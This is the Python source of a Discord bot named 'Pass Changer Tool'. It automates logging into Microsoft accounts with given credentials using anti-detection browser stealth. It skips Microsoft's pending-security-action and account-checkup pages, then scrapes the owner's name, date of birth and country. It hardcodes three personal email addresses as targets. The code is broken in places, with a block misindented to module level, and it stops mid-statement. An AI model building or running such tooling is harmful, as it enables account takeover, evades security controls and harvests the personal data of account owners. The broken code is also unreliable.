"""
Pass Changer Tool
Created by Vyom
Enhanced by Vyom
"""

import sys
import time
import random
import re
import threading
import hashlib
import os
import tempfile
import shutil
import io
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

import asyncio
import discord
from discord.ext import commands
from dotenv import load_dotenv

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium_stealth import stealth
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException


# Load environment variables from .env file
print("Loading environment variables...")
load_dotenv()

# Get token and owner ID from environment variables
token = os.getenv('DISCORD_TOKEN')
owner_id = os.getenv('BOT_OWNER_ID')

print(f"DISCORD_TOKEN found: {'Yes' if token else 'No'}")
print(f"BOT_OWNER_ID found: {'Yes' if owner_id else 'No'}")

if not token:
    raise ValueError("No DISCORD_TOKEN found in .env file")
if not owner_id:
    raise ValueError("No BOT_OWNER_ID found in .env file")

try:
    owner_id = int(owner_id)
except ValueError:
    raise ValueError("BOT_OWNER_ID must be a valid integer")

HEADLESS_MODE = True  # Always true on Railway

# Auto-detect Railway environment
import os
if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_SERVICE_NAME'):
    HEADLESS_MODE = True
    print("🚀 Running on Railway - Headless mode forced")

class Emojis:
    """
    Centralized emoji configuration.
    These are set up for animated emojis.
    IMPORTANT: You must replace '000000000000000000' with the actual ID of your uploaded emojis.
    To find an emoji ID, type \:emoji_name: in Discord.
    """
    LOADING = "<a:loading:1453736067105685674>"
    SUCCESS = "<a:success:1453735593577283657>"
    ERROR = "<a:error:1453735727140700269>"
    WARNING = "<a:warning:1453735851048702125>"
    
    LOCK = "<a:lock:1453733428662112277>"
    KEY = "<a:keys:1453736096549699737>"
    EMAIL = "📧"
    CLOCK = "⏰"
    TIMER = "⏲️"
    SEARCH = "<a:search:1453763435769888893>"
    EDIT = "<a:edit:1453763723733897354>"
    CHAT = "<a:CHAT:1453763876993634488>"
    LIGHTNING = "<a:lightning_l:1453764092295905321>"
    PIN = "<a:pin:1453762565586030769>"
    CHART = "<a:chart~1:1453768256849580267>"
    SIREN = "<a:alert:1453762780195848357>"
    QUESTION = "❓"
    STOP = "🛑"
    PARTY = "🎉"
    LINK = "🔗"
    PHONE = "📞"
    SOS = "🆘"
    EYES = "👀"
    KEYBOARD = "⌨️"
    HOURGLASS = "⏳"
    BAN = "🚫"
    NUM1 = "1️⃣"
    NUM2 = "<a:2b:1453767835057786931>"
    NUM3 = "<:3b:1453770889718923475>"

class CPUIntensiveProcessor:
    """CPU intensive operations to maximize CPU usage and minimize GPU usage"""

    @staticmethod
    def hash_operations(data, iterations=10000):
        """Perform CPU-intensive hashing operations"""
        result = data
        for _ in range(iterations):
            result = hashlib.sha256(result.encode()).hexdigest()
        return result

    @staticmethod
    def text_processing(text, iterations=1000):
        """CPU-intensive text processing operations"""
        processed = text
        for i in range(iterations):
            processed = ''.join(reversed(processed))
            processed = processed.upper() if i % 2 == 0 else processed.lower()
            processed = processed.replace('a', '1').replace('1', 'a')
            processed = processed[:len(processed) // 2] + processed[len(processed) // 2:]
        return processed

    @staticmethod
    def mathematical_operations(base_num=12345, iterations=10000):
        """CPU-intensive mathematical calculations (optimized for speed)"""
        result = base_num
        for _ in range(iterations):
            result = (result * 7) % 1000000
            result = result ** 2 % 999999
            result = int(result ** 0.5)
        return result


class SimpleSignal:
    def __init__(self):
        self._handlers = []

    def connect(self, handler):
        self._handlers.append(handler)

    def emit(self, *args):
        for handler in self._handlers:
            try:
                handler(*args)
            except Exception as e:
                print(f"Error in signal handler: {e}")

class ScraperWorker:
    def __init__(self, account_email, account_password, headless=False):
        self.account_email = account_email
        self.account_password = account_password
        self.headless = headless
        self.first_name = "Not Available"
        self.last_name = "Not Available"
        self.dob = "Not Available"
        self.country = "Not Available"
        self.postal = ""
        self.alt_email = "Recovery_Not_Attempted"
        self.cpu_processor = CPUIntensiveProcessor()
        self.executor = ThreadPoolExecutor(max_workers=4)
        self.driver = None
        self.temp_profile_dir = None

        self.collected_emails = []
        self.collected_subjects = []

        self.target_emails = [
            "abdullahahmad123456789@gmail.com",
            "khurshidiahmad22@outlook.com",
            "skylergamer180@gmail.com",
        ]

        self._retry_response = None
        
        # Initialize signals
        self.log_signal = SimpleSignal()
        self.initial_setup_completed_signal = SimpleSignal()
        self.full_process_completed_signal = SimpleSignal()
        self.intermediate_result_signal = SimpleSignal()
        self.progress_update_signal = SimpleSignal()
        self.captcha_image_signal = SimpleSignal()
        self.ask_retry_signal = SimpleSignal()
        self.retry_decision_signal = SimpleSignal()
        self.retry_decision_signal.connect(self._set_retry_response)

        self.random_subjects = [
            "Quick Question",
            "Checking In",
            "Regarding Your Account",
            "Important Update",
            "Hello from Bot",
        ]
        self.random_messages = [
            "Hope you are having a great day!",
            "Just wanted to touch base regarding something.",
            "Please disregard if this is not relevant.",
            "This is an automated message.",
            "Wishing you all the best.",
        ]

        # Optional synchronous callbacks that can be provided by the
        # Discord layer. They are expected to block until the user replies
        # in DM (e.g. with a CAPTCHA solution or a verification code), then
        # return the text to type into the page. When not set, the flow
        # simply skips those interactive steps.
        self.captcha_solver = None
        self.code_solver = None
        self.confirmation_callback = None

    def _set_retry_response(self, response: bool):
        self._retry_response = response

    def close_browser(self):
        """Closes the browser and cleans up the temporary profile directory."""
        self.log_signal.emit("Closing browser...")
        if self.driver:
            try:
                self.driver.quit()
            except Exception as e:
                self.log_signal.emit(f"Error quitting driver: {e}")
            self.driver = None
        if self.temp_profile_dir and os.path.exists(self.temp_profile_dir):
            try:
                shutil.rmtree(self.temp_profile_dir, ignore_errors=True)
                self.log_signal.emit("Temporary profile directory cleaned.")
            except Exception as cleanup_error:
                self.log_signal.emit(f"Cleanup warning: {cleanup_error}")
        self.executor.shutdown(wait=True)

    def cpu_intensive_delay(self, min_s=1.0, max_s=2.5):
        """Minimal delay for stability."""
        time.sleep(random.uniform(0.1, 0.3))

    def _human_like_type(self, element, text, min_char_delay=0.04, max_char_delay=0.12):
        """Types text instantly."""
        if not self.driver or element is None:
            return
        try:
            element.send_keys(text)
        except Exception as e:
            self.log_signal.emit(f"Typing error: {e}")

    def _initialize_driver(self):
        """Initializes the Selenium WebDriver with stealth options."""
        self.progress_update_signal.emit(5, "Initializing browser...")
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        ]
        random_user_agent = random.choice(user_agents)

        self.temp_profile_dir = tempfile.mkdtemp()
options = webdriver.ChromeOptions()

# ===== RAILWAY FIX =====
# Always use headless on Railway
if self.headless or os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_SERVICE_NAME'):
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument("--memory-pressure-off")
    options.add_argument("--max_old_space_size=512")
    options.add_argument("--disable-setuid-sandbox")
    
    # Tell Selenium where to find Chromium on Railway
    chromium_paths = [
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser", 
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/nix/store/*-chromium/bin/chromium",
    ]
    for path in chromium_paths:
        try:
            options.binary_location = path
            self.log_signal.emit(f"Trying Chrome at: {path}")
            break
        except:
            continue
# ===== END RAILWAY FIX =====

# Your existing code continues...

        width = random.randint(1024, 1440)
        height = random.randint(700, 900)
        options.add_argument(f"--window-size={width},{height}")

        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
        except Exception as e:
            self.log_signal.emit(f"ChromeDriverManager failed, falling back: {e}")
            self.driver = webdriver.Chrome(options=options)

        driver = self.driver
        driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument",
            {
                "source": """
              Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined
              });
              window.chrome = { runtime: {} };
              Object.defineProperty(navigator, 'plugins', {
                 get: () => [1, 2, 3, 4, 5],
              });
              Object.defineProperty(navigator, 'languages', {
                 get: () => ['en-US', 'en'],
              });
           """
            },
        )
        stealth(
            driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Corporation",
            renderer="Intel UHD Graphics",
            fix_hairline=True,
        )
        driver.execute_script(
            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
        )
        self.log_signal.emit("WebDriver initialized.")
        self.progress_update_signal.emit(10, "Browser initialized.")

    def _perform_login_check(self):
        """Attempts auto login (email + password), then waits for confirmation.

        If auto login fails for any reason, it falls back to manual login while
        still waiting for the account.microsoft.com redirect.
        """
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        driver = self.driver
        driver.get("https://login.live.com/")

        self.log_signal.emit(
            f"Login debug: account_email={repr(self.account_email)}, "
            f"has_password={bool(self.account_password)}"
        )

        auto_login_used = False

        if self.account_email and self.account_password:
            self.progress_update_signal.emit(15, "Auto login in progress...")
            try:
                # --- Email step ---
                email_locators = [
                    (By.NAME, "loginfmt"),
                    (By.ID, "i0116"),
                    (By.CSS_SELECTOR, "input[type='email']"),
                    (By.CSS_SELECTOR, "input[type='text']"),
                ]

                email_box = None
                last_err = None
                for how, value in email_locators:
                    try:
                        self.log_signal.emit(f"Trying email locator: {how}={value}")
                        # Be tolerant here: just wait for presence, then scroll
                        # into view and click via JS/mouse.
                        email_box = WebDriverWait(driver, 12).until(
                            EC.presence_of_element_located((how, value))
                        )
                        try:
                            driver.execute_script(
                                "arguments[0].scrollIntoView({block: 'center'});",
                                email_box,
                            )
                        except Exception:
                            pass
                        try:
                            ActionChains(driver).move_to_element(email_box).click().perform()
                        except Exception:
                            try:
                                driver.execute_script("arguments[0].click();", email_box)
                            except Exception:
                                pass
                        break
                    except Exception as e:
                        last_err = e
                        continue

                # Fallback: try JS querySelector directly if still not found/clicked
                if email_box is None:
                    try:
                        self.log_signal.emit(
                            "Email: falling back to JS querySelector lookup for login field."
                        )
                        email_box = driver.execute_script(
                            "return document.querySelector('input[name=\"loginfmt\"], #i0116, input[type=\"email\"], input[type=\"text\"]');"
                        )
                    except Exception:
                        email_box = None

                if email_box is None:
                    self.log_signal.emit(
                        f"Could not find email field with any locator or JS fallback; last error: {last_err}"
                    )
                    raise last_err or RuntimeError("Email field not found")

                try:
                    email_box.clear()
                except Exception:
                    pass
                self._human_like_type(email_box, self.account_email)
                ActionChains(driver).send_keys(Keys.ENTER).perform()
                self.log_signal.emit("Typed email and submitted.")
                time.sleep(0.2)

                # --- Password step with helper flows ---
                end = time.time() + 60
                password_typed = False
                password_locators = [
                    (By.NAME, "passwd"),
                    (By.ID, "i0118"),
                    (By.CSS_SELECTOR, "input[type='password']"),
                ]

                while time.time() < end and not password_typed:
                    # A) Try to get out of the verify-email screen via "Other ways to sign in".
                    try:
                        other_ways_locators = [
                            # Known Microsoft ID on some variants
                            (By.ID, "idA_PWD_SwitchToCredPicker"),
                            # Exact span role="button" from your HTML
                            (
                                By.XPATH,
                                "//span[@role='button' and normalize-space(text())='Other ways to sign in']",
                            ),
                            # Any clickable element containing the text as a fallback
                            (
                                By.XPATH,
                                "//*[self::a or self::button or self::div or self::span][contains(normalize-space(.), 'Other ways to sign in')]",
                            ),
                        ]
                        for how_o, val_o in other_ways_locators:
                            try:
                                self.log_signal.emit(
                                    f"Checking for 'Other ways to sign in' link: {how_o}={val_o}"
                                )
                                other_ways_el = WebDriverWait(driver, 6).until(
                                    EC.element_to_be_clickable((how_o, val_o))
                                )
                                driver.execute_script(
                                    "arguments[0].scrollIntoView({block: 'center'});",
                                    other_ways_el,
                                )
                                # Move mouse over it then JS-click for reliability
                                try:
                                    ActionChains(driver).move_to_element(other_ways_el).click().perform()
                                except Exception:
                                    driver.execute_script("arguments[0].click();", other_ways_el)
                                self.log_signal.emit(
                                    "Clicked 'Other ways to sign in' on verify screen."
                                )
                                break
                            except Exception:
                                continue
                    except Exception:
                        pass

                    # B) On "Sign in another way", pick "Use your password".
                    try:
                        use_pwd_locators = [
                            # Exact span role="button" from your HTML
                            (
                                By.XPATH,
                                "//span[@role='button' and normalize-space(text())='Use your password']",
                            ),
                            # Any clickable element containing the text as a fallback
                            (
                                By.XPATH,
                                "//*[self::div or self::button or self::span or self::a][contains(normalize-space(.), 'Use your password')]",
                            ),
                        ]
                        for how_u, val_u in use_pwd_locators:
                            try:
                                self.log_signal.emit(
                                    f"Checking for 'Use your password' option: {how_u}={val_u}"
                                )
                                # Some variants render the label span inside a
                                # non-button container that Selenium doesn't
                                # consider "clickable". Just wait for it to be
                                # present/visible, then scroll and JS-click.
                                use_pwd_el = WebDriverWait(driver, 10).until(
                                    EC.presence_of_element_located((how_u, val_u))
                                )
                                driver.execute_script(
                                    "arguments[0].scrollIntoView({block: 'center'});",
                                    use_pwd_el,
                                )
                                # Prefer a real mouse click on the container if
                                # possible, otherwise JS-click the element
                                try:
                                    ActionChains(driver).move_to_element(use_pwd_el).click().perform()
                                except Exception:
                                    driver.execute_script("arguments[0].click();", use_pwd_el)
                                self.log_signal.emit(
                                    "Clicked 'Use your password' on verify/sign-in-another-way screen."
                                )
                                break
                            except Exception:
                                continue
                    except Exception:
                        pass

                    # C) Finally, try to locate and fill the password field.
                    for how_p, val_p in password_locators:
                        try:
                            self.log_signal.emit(
                                f"Trying password locator: {how_p}={val_p}"
                            )
                            pwd_box = WebDriverWait(driver, 5).until(
                                EC.element_to_be_clickable((how_p, val_p))
                            )
                            try:
                                pwd_box.click()
                            except Exception:
                                pass
                            self._human_like_type(pwd_box, self.account_password)
                            ActionChains(driver).send_keys(Keys.ENTER).perform()
                            self.log_signal.emit("Typed password and submitted.")

                            # Immediately after submitting the password, aggressively
                            # look for the security-info "Next" button by id
                            # iLandingViewAction and click it if present. This is a
                            # fast-path so we don't have to wait for the general
                            # post-login handler.
                            try:
                                self.log_signal.emit(
                                    "Login: running immediate Next-button watcher after password submit."
                                )
                                end_next = time.time() + 3
                                while time.time() < end_next:
                                    # If "Stay signed in" is already visible, break so the main loop handles it immediately.
                                    try:
                                        if driver.find_elements(By.ID, "idSIButton9") or driver.find_elements(By.XPATH, "//input[@value='Yes']"):
                                            break
                                    except Exception:
                                        pass

                                    try:
                                        next_btn_quick = driver.execute_script(
                                            "return document.getElementById('iLandingViewAction');"
                                        )
                                    except Exception:
                                        next_btn_quick = None

                                    if next_btn_quick:
                                        try:
                                            driver.execute_script(
                                                "arguments[0].scrollIntoView({block: 'center'});",
                                                next_btn_quick,
                                            )
                                        except Exception:
                                            pass
                                        try:
                                            driver.execute_script(
                                                "arguments[0].click();",
                                                next_btn_quick,
                                            )
                                        except Exception:
                                            try:
                                                ActionChains(driver).move_to_element(next_btn_quick).click().perform()
                                            except Exception:
                                                pass
                                        self.log_signal.emit(
                                            "Login: immediate watcher clicked 'Next' (iLandingViewAction)."
                                        )
                                        break

                                    time.sleep(0.1)
                            except Exception as e_im_next:
                                self.log_signal.emit(
                                    f"Login: immediate Next-button watcher error (non-fatal): {e_im_next}"
                                )

                            password_typed = True
                            break
                        except Exception:
                            continue

                    if not password_typed:
                        time.sleep(0.1)

                # Final JS-based fallback: if we still haven't managed to type the
                # password (e.g. due to a slightly different layout), try a direct
                # querySelector lookup for any reasonable password field and type
                # into it. This specifically targets the simple "Enter your
                # password" page you showed in the screenshot.
                if not password_typed:
                    try:
                        self.log_signal.emit(
                            "Password loop ended without success; trying JS fallback for password field."
                        )
                        pwd_box_js = driver.execute_script(
                            """return document.querySelector('input[name="passwd"], #i0118, input[type="password"]');"""
                        )
                        if pwd_box_js:
                            try:
                                driver.execute_script(
                                    "arguments[0].scrollIntoView({block: 'center'});",
                                    pwd_box_js,
                                )
                            except Exception:
                                pass
                            try:
                                pwd_box_js.click()
                            except Exception:
                                pass
                            self._human_like_type(pwd_box_js, self.account_password)
                            ActionChains(driver).send_keys(Keys.ENTER).perform()
                            self.log_signal.emit(
                                "Typed password via JS-fallback and submitted."
                            )
                            password_typed = True
                    except Exception as e_js_pwd:
                        self.log_signal.emit(
                            f"Password JS-fallback failed (non-fatal): {e_js_pwd}"
                        )

                if password_typed:
                    auto_login_used = True
                else:
                    self.log_signal.emit(
                        "Password field not found in time; falling back to manual assistance."
                    )
            except Exception as e:
                self.log_signal.emit(
                    f"Auto login failed, falling back to manual: {repr(e)}"
                )

        if not auto_login_used:
            self.progress_update_signal.emit(15, "Waiting for manual login...")
            self.log_signal.emit(
                "Opened Microsoft login page. Please log in manually (MFA / security steps, etc.)."
            )
            # Surface a clear BOT message so the Discord side can tell the user
            # that the flow is waiting on manual login, often around the
            # "Use your password" or password page.
            self.log_signal.emit(
                "[BOT] Login appears to be stuck near 'Use your password' or the password page; "
                "please open the browser on the host and complete the login manually."
            )

        # After auto or manual, wait for redirect away from login.live.com.
        # While we are still on login.live.com, also watch for the
        # "Stay signed in?" dialog and click its Yes button so that this
        # step is automated even before the redirect.
        start_time = time.time()
        login_detected = False
        while time.time() - start_time < 240:
            try:
                current = driver.current_url
            except Exception:
                break

            # While still on login.live.com, try to auto-click the
            # "Stay signed in?" Yes button if it appears. The variant you
            # showed uses data-testid="primaryButton" and text "Yes".
            try:
                stay_yes_inline = None
                try:
                    stay_yes_inline = driver.find_element(
                        By.XPATH,
                        "//button[@data-testid='primaryButton' and normalize-space(text())='Yes']",
                    )
                except Exception:
                    stay_yes_inline = None

                if (
                    stay_yes_inline
                    and stay_yes_inline.is_displayed()
                    and stay_yes_inline.is_enabled()
                ):
                    self.log_signal.emit(
                        "Login: clicking 'Yes' on 'Stay signed in' dialog (inline watcher)."
                    )
                    try:
                        driver.execute_script(
                            "arguments[0].scrollIntoView({block: 'center'});",
                            stay_yes_inline,
                        )
                    except Exception:
                        pass
                    try:
                        ActionChains(driver).move_to_element(stay_yes_inline).click().perform()
                    except Exception:
                        try:
                            stay_yes_inline.click()
                        except Exception:
                            pass
                    time.sleep(0.5)
            except Exception:
                pass

            # Treat any redirect off login.live.com (e.g. to account.live.com
            # or account.microsoft.com) as a successful login context so that
            # we can immediately handle post-login dialogs such as the
            # security-info pending "Next" page.
            if "login.live.com" not in current:
                login_detected = True
                break
            time.sleep(0.2)

        if login_detected:
            self.log_signal.emit("Login detected!")
            self.progress_update_signal.emit(20, "Login successful.")
        else:
            self.log_signal.emit(
                "Login not confirmed (timeout) – proceeding anyway."
            )
            self.progress_update_signal.emit(20, "Login timed out, proceeding...")

        # Best-effort: click through common post-login dialogs like
        # "Your security info change is still pending" (Next) and
        # "Stay signed in?" (Yes).
        try:
            self._handle_post_login_interstitials()
        except Exception as e:
            self.log_signal.emit(f"Post-login interstitial handler failed: {e}")

        self.cpu_intensive_delay(0.1, 0.5)

    def _handle_post_login_interstitials(self):
        """Click through common Microsoft post-login dialogs.

        - Security info change pending page: click the **Next** button.
        - "Stay signed in?" dialog is already handled earlier inline.
        """
        if not self.driver:
            return

        driver = self.driver
        self.log_signal.emit("Login: entering post-login interstitial handler.")
        try:
            # First, try our dedicated popup-dismiss helper.
            try:
                self._dismiss_account_checkup_popups()
            except Exception as e:
                self.log_signal.emit(f"Security popup helper error (non-fatal): {e}")

            # Then, for a short period, watch for a redirect to account-checkup and
            # immediately navigate back to the profile page if it happens.
            end = time.time() + 3
            while time.time() < end:
                try:
                    current_url = driver.current_url
                except Exception:
                    break

                if "account-checkup" in current_url:
                    self.log_signal.emit(
                        "Login: detected account-checkup pending security page after navigation; "
                        "forcing navigation back to profile URL."
                    )
                    try:
                        driver.get("https://account.microsoft.com/profile/")
                    except Exception as nav_err:
                        self.log_signal.emit(
                            f"Login: navigation away from account-checkup failed (non-fatal): {nav_err}"
                        )
                    break

                time.sleep(0.5)
        except Exception as e:
            self.log_signal.emit(f"Post-login interstitial handler failed: {e}")

    def _dismiss_account_checkup_popups(self):
        """Dismisses common account checkup/security popups."""
        if not self.driver:
            return
        try:
            # Look for common dismissal buttons in dialogs
            popups = self.driver.find_elements(By.XPATH, "//div[@role='dialog']//button | //div[contains(@class, 'modal')]//button")
            for btn in popups:
                if not btn.is_displayed():
                    continue
                text = btn.text.lower()
                # Keywords for buttons that dismiss/skip prompts
                if any(x in text for x in ["no thanks", "later", "cancel", "close", "maybe later", "remind me later"]):
                    try:
                        self.log_signal.emit(f"Dismissing popup with button: {text}")
                        btn.click()
                        time.sleep(1)
                    except Exception:
                        pass
        except Exception:
            pass

    def _handle_outlook_marketing_landing(self):
        """Handles redirection from Outlook marketing page to webmail."""
        if not self.driver:
            return
        current_url = self.driver.current_url.lower()
        if "outlook.live.com/owa" in current_url or "microsoft.com/en-us/microsoft-365/outlook" in current_url:
            self.log_signal.emit("Detected Outlook marketing page, redirecting to mailbox...")
            self.driver.get("https://outlook.live.com/mail/0/")
            time.sleep(3)

    def _extract_first_last_from_edit_name(self):
        """Fallback: open the 'Edit name' dialog and read first/last name fields.

        This is used when the main full-name selectors fail or when we want a
        more precise split for first/last name.
        """
        if not self.driver:
            return None, None

        driver = self.driver
        try:
            # Try to locate and click the 'Edit name' link/button on the profile page.
            edit_locators = [
                (
                    By.XPATH,
                    "//a[normalize-space(text())='Edit name']",
                ),
                (
                    By.XPATH,
                    "//button[normalize-space(text())='Edit name']",
                ),
                (
                    By.XPATH,
                    "//*[self::a or self::button][contains(normalize-space(.), 'Edit name')]",
                ),
            ]
            edit_clicked = False
            for how, val in edit_locators:
                try:
                    el = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((how, val))
                    )
                    driver.execute_script(
                        "arguments[0].scrollIntoView({block: 'center'});",
                        el,
                    )
                    try:
                        ActionChains(driver).move_to_element(el).click().perform()
                    except Exception:
                        driver.execute_script("arguments[0].click();", el)
                    self.log_signal.emit(
                        f"Profile: clicked 'Edit name' using locator {how}={val}."
                    )
                    edit_clicked = True
                    break
                except Exception:
                    continue

            if not edit_clicked:
                self.log_signal.emit("Profile: 'Edit name' link/button not found.")
                return None, None

            # Wait for the edit-name dialog and grab the first two text inputs.
            try:
                inputs = WebDriverWait(driver, 10).until(
                    lambda d: d.find_elements(
                        By.XPATH,
                        "//div[@role='dialog' or @aria-modal='true']//input[@type='text']",
                    )
                )
            except Exception:
                # Fallback: any text inputs on the edit-name page
                inputs = driver.find_elements(By.XPATH, "//input[@type='text']")

            if len(inputs) < 1:
                self.log_signal.emit("Profile: no text inputs found in 'Edit name' dialog.")
                return None, None

            first = inputs[0].get_attribute("value").strip() if len(inputs) >= 1 else ""
            last = inputs[1].get_attribute("value").strip() if len(inputs) >= 2 else ""

            if not first and not last:
                self.log_signal.emit(
                    "Profile: 'Edit name' dialog did not contain non-empty first/last name."
                )
                return None, None

            self.log_signal.emit(
                f"Profile: extracted from 'Edit name' dialog -> first='{first}', last='{last}'."
            )

            # Try to close the dialog (non-fatal if it fails).
            try:
                ActionChains(driver).send_keys(Keys.ESCAPE).perform()
            except Exception:
                try:
                    close_btn = driver.find_element(
                        By.XPATH,
                        "//button[@aria-label='Close' or @title='Close']",
                    )
                    driver.execute_script("arguments[0].click();", close_btn)
                except Exception:
                    pass

            return first or None, last or None
        except Exception as e:
            self.log_signal.emit(f"Profile: error while using 'Edit name' dialog: {e}")
            return None, None

    def _parse_profile_dob(self, text: str) -> str | None:
        text = (text or "").strip()
        if not text:
            return None

        m = re.search(r"(\d{1,2})[/-](\d{1,2})[/-](\d{2,4})", text)
        if m:
            mm, dd, yy = m.groups()
            if len(yy) == 2:
                yi = int(yy)
                yy = ("19" if yi > 30 else "20") + yy
            return f"{int(mm):02d}/{int(dd):02d}/{yy}"

        month_map = {
            "january": 1,
            "february": 2,
            "march": 3,
            "april": 4,
            "may": 5,
            "june": 6,
            "july": 7,
            "august": 8,
            "september": 9,
            "october": 10,
            "november": 11,
            "december": 12,
        }

        m = re.search(r"(\d{1,2})\s+([A-Za-z]+)\s+(\d{4})", text)
        if m:
            dd, month_name, yy = m.groups()
            key = month_name.lower()
            if key in month_map:
                mm = month_map[key]
                return f"{mm:02d}/{int(dd):02d}/{yy}"

        m = re.search(r"([A-Za-z]+)\s+(\d{1,2}),\s*(\d{4})", text)
        if m:
            month_name, dd, yy = m.groups()
            key = month_name.lower()
            if key in month_map:
                mm = month_map[key]
                return f"{mm:02d}/{int(dd):02d}/{yy}"

        return None

    def _extract_profile_info(self):
        """Extracts profile information from the account page."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        driver = self.driver
        driver.get("https://account.microsoft.com/profile/")

        # Some accounts are forcibly redirected to a dedicated account-checkup
        # URL ("You have a pending security action") even when we try to go
        # straight to the profile page. If that happens here, immediately
        # bypass it by navigating back to the profile URL so the modal cannot
        # block scraping.
        try:
            current_url = driver.current_url
        except Exception:
            current_url = ""

        if "account-checkup" in current_url:
            self.log_signal.emit(
                "Profile: detected account-checkup pending security page after navigation; "
                "forcing navigation back to profile URL."
            )
            try:
                driver.get("https://account.microsoft.com/profile/")
            except Exception as nav_err:
                self.log_signal.emit(
                    f"Profile: navigation away from account-checkup failed (non-fatal): {nav_err}"
                )

        self.log_signal.emit("Navigating to Profile Section...")

        # Some accounts are temporarily redirected to an account checkup / security
        # overlay (e.g. "You have a pending security action"). Try to dismiss any
        # such popup so it does not block profile scraping.
        try:
            self._dismiss_account_checkup_popups()
        except Exception as e:
            self.log_signal.emit(f"Security popup handler error (non-fatal): {e}")

        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        # Wait for dynamic content
        WebDriverWait(driver, 15).until(
            lambda d: d.execute_script("return document.readyState") == "complete"
        )
        self.cpu_intensive_delay(0.5, 1.0)  # Human-like pause after navigating to profile

        full_name = "Not Available"
        dob_local = "Not Available"
        country_local = "Not Available"

        name_selectors = [
            "//span[normalize-space()='Full name']/ancestor::div[1]/following-sibling::div[1]//span[1]",
            "//span[normalize-space()='Full name']/following::span[1]",
            "//div[contains(@data-test-id, 'fullName')]//span[last()]",
            "//div[contains(@class, 'full-name')]//span",
            "//*[contains(@aria-label, 'full name')]",
        ]

        for selector in name_selectors:
            try:
                element = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, selector))
                )
                full_name = element.text.strip()
                if full_name and full_name != "Not Available":
                    self.log_signal.emit(f"Found Full Name using selector: {selector}")
                    break
            except Exception:
                continue
        if full_name == "Not Available":
            self.log_signal.emit("Failed to extract Full Name with all selectors.")

            # Fallback: attempt to open the 'Edit name' dialog and read
            # first/last name directly from its fields.
            try:
                first_from_edit, last_from_edit = self._extract_first_last_from_edit_name()
                if first_from_edit or last_from_edit:
                    # Reconstruct a full name for logging/consistency.
                    parts = []
                    if first_from_edit:
                        parts.append(first_from_edit)
                    if last_from_edit:
                        parts.append(last_from_edit)
                    full_name = " ".join(parts).strip() or "Not Available"
                    self.log_signal.emit(
                        "Profile: using names from 'Edit name' dialog as fallback for full name."
                    )
            except Exception as e:
                self.log_signal.emit(
                    f"Profile: fallback to 'Edit name' dialog for name failed: {e}"
                )

            # Extra fallback: derive the full name from body text line under
            # the 'Full name' label if present.
            if full_name == "Not Available":
                try:
                    body_text = self.driver.find_element(By.TAG_NAME, "body").text
                    m = re.search(
                        r"Full name\s*\n\s*([^\n]+)",
                        body_text,
                        re.IGNORECASE,
                    )
                    if m:
                        candidate = m.group(1).strip()
                        if candidate:
                            full_name = candidate
                            self.log_signal.emit(
                                "Profile: deriving full name from text under 'Full name' label."
                            )
                except Exception:
                    pass

        # Final fallback for hosted / fully-automated mode: if we still don't
        # have a name but we do know the primary email, derive a simple name
        # from the email local-part (before '@'). This is better than leaving
        # everything blank and keeps the flow moving.
        if full_name == "Not Available" and getattr(self, "email_addr", None):
            try:
                local = self.email_addr.split("@", 1)[0]
                for ch in [".", "_", "-", "+"]:
                    local = local.replace(ch, " ")
                derived_name = local.strip().title()
                if derived_name:
                    full_name = derived_name
                    self.log_signal.emit(
                        f"Profile: deriving fallback full name from email local-part -> '{full_name}'."
                    )
            except Exception:
                pass

        dob_selectors = [
            "//span[normalize-space()='Date of birth']/following::span[1]",
            "//span[normalize-space()='Birth date']/following::span[1]",
            "//div[contains(@id, 'date-of-birth')]//span",
            "//div[contains(@id, 'birth')]//span",
            "//div[contains(@class, 'birth')]//span",
            "//*[contains(@aria-label, 'birth')]",
        ]

        for selector in dob_selectors:
            try:
                elements = self.driver.find_elements(By.XPATH, selector)
                for elem in elements:
                    text = elem.text.strip()
                    parsed = self._parse_profile_dob(text)
                    if parsed:
                        dob_local = parsed
                        self.log_signal.emit(f"Found DOB using selector: {selector}")
                        break
                if dob_local != "Not Available":
                    break
            except Exception:
                continue
        if dob_local == "Not Available":
            self.log_signal.emit("Failed to extract Date of Birth with all selectors.")

            # Extra fallback: read the line under a "Date of birth" / "Birth date"
            # label from the page body text.
            try:
                body_text = self.driver.find_element(By.TAG_NAME, "body").text
                m = re.search(
                    r"(Date of birth|Birth date)\s*\n\s*([^\n]+)",
                    body_text,
                    re.IGNORECASE,
                )
                if m:
